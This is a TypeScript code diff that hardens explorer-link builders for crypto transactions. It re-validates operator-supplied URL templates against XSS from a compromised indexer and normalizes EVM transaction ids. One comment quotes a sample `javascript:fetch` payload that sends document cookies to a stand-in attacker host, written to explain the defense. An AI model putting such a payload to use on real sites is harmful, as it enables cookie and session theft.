@@ -37,7 +37,8 @@ import {
 	BUNDLED_BCH_CHAT_LINK_URL,
 	BUNDLED_LTC_CHAT_LINK_URL,
 	BUNDLED_DASH_CHAT_LINK_URL,
-	substituteTxidIntoTemplate
+	substituteTxidIntoTemplate,
+	isValidChatLinkTemplate
 } from './urlsCore';
 import {
 	USDT_NETWORK_METADATA,
@@ -124,7 +125,19 @@ export function externalExplorerUrl(asset: ExternalAsset, txid: string): string 
 	if (entry === undefined) return null;
 	if (!entry.txidRe.test(txid)) return null;
 	const lower = txid.toLowerCase();
-	const tpl = getInstanceSnapshot().chat_link_urls[entry.instanceTplKey] ?? entry.bundledDefault;
+	const operatorTpl = getInstanceSnapshot().chat_link_urls[entry.instanceTplKey];
+	// cp30-DD-DD SEC-1 (defense-in-depth) — re-validate the
+	// operator-supplied template before using it.  The indexer's
+	// zod schema is supposed to catch malformed templates at
+	// startup, but a hostile or compromised indexer could serve
+	// anything; without this check, a value like
+	// `javascript:fetch('https://attacker/'+document.cookie)`
+	// would land in an `<a href={...}>` and execute on click.
+	// On invalid-from-indexer, fall through to the bundled default
+	// instead of producing the malicious URL.
+	const tpl = operatorTpl !== null && operatorTpl !== undefined && isValidChatLinkTemplate(operatorTpl)
+		? operatorTpl
+		: entry.bundledDefault;
 	return substituteTxidIntoTemplate(tpl, lower);
 }
 
@@ -158,11 +171,28 @@ export function usdtExplorerUrl(network: UsdtNetwork, txid: string): string | nu
 	const usdtOverrides = getInstanceSnapshot().chat_link_urls.usdt;
 	const override = usdtOverrides ? usdtOverrides[network] : null;
 
-	if (override) {
+	// cp30-DD-DD SEC-1 (defense-in-depth) — re-validate the
+	// operator-supplied template before using it.  Without this,
+	// a hostile/compromised indexer could serve a `javascript:`
+	// URL that becomes an `<a href={...}>` and executes on click.
+	// On validation failure, fall through to the bundled default
+	// instead of substituting into the malicious template.
+	if (override && isValidChatLinkTemplate(override)) {
 		// Operator configured a per-network template — substitute
-		// the txid into it.  Normalize hex txids to lowercase;
-		// SPL is base58 case-sensitive so leave as-is.
-		const normalized = network === 'spl' ? txid : txid.toLowerCase();
+		// the txid into it.  Normalize the txid the same way the
+		// bundled-default path does (cp30-DD-DD SEC-4):
+		//   - SPL: base58 case-sensitive, no normalization
+		//   - EVM family (erc20, bep20): lowercase + 0x prefix
+		//   - TRC-20: lowercase, no prefix
+		let normalized: string;
+		if (network === 'spl') {
+			normalized = txid;
+		} else if (network === 'erc20' || network === 'bep20') {
+			const lc = txid.toLowerCase();
+			normalized = lc.startsWith('0x') ? lc : `0x${lc}`;
+		} else {
+			normalized = txid.toLowerCase();
+		}
 		return substituteTxidIntoTemplate(override, normalized);
 	}
 
@@ -183,8 +213,19 @@ export function usdcExplorerUrl(network: UsdcNetwork, txid: string): string | nu
 	const usdcOverrides = getInstanceSnapshot().chat_link_urls.usdc;
 	const override = usdcOverrides ? usdcOverrides[network] : null;
 
-	if (override) {
-		const normalized = network === 'spl' ? txid : txid.toLowerCase();
+	// cp30-DD-DD SEC-1 (defense-in-depth) — same XSS-protection
+	// posture as usdtExplorerUrl above.
+	if (override && isValidChatLinkTemplate(override)) {
+		// cp30-DD-DD SEC-4 — EVM-family normalization (USDC has no
+		// TRC-20 / BEP-20 branches; only SPL is non-EVM here).
+		let normalized: string;
+		if (network === 'spl') {
+			normalized = txid;
+		} else {
+			// erc20, base, polygon — all EVM-family
+			const lc = txid.toLowerCase();
+			normalized = lc.startsWith('0x') ? lc : `0x${lc}`;
+		}
 		return substituteTxidIntoTemplate(override, normalized);
 	}
 
